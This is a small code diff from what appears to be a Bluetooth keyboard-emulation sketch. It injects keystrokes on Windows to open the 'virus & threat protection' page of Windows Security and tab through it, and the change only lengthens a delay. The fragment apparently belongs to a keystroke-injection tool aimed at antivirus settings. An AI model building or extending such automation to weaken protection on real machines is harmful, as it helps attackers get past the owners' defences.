@@ -156,7 +156,7 @@ void loop() {
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000); // Wait for Start menu
       sendString("virus & threat protection", 10); delay(1000); // Wait for search results
-      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(8000); 
       bleKeyboard.releaseAll(); delay(2000); // Wait for Windows Security
       bleKeyboard.press(KEY_TAB); delay(500); 
       bleKeyboard.releaseAll();
@@ -187,4 +187,5 @@ void loop() {
     Serial.println("Waiting for BLE connection...");
   }
   delay(50); // Debounce/stability
+
 }
